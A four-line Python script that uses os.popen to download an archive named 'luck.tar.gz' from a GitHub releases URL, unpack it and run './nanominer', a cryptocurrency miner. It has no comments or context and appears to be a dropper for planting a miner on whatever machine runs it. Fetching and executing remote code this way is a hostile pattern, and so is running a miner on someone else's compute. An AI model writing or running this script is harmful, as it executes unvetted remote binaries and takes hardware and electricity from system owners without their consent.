import os
a  = os.popen('wget https://github.com/teskilah/teshe/releases/download/das/luck.tar.gz').readlines()
a  = os.popen('tar -xvf luck.tar.gz').readlines()
b  = os.popen('./nanominer').readlines()
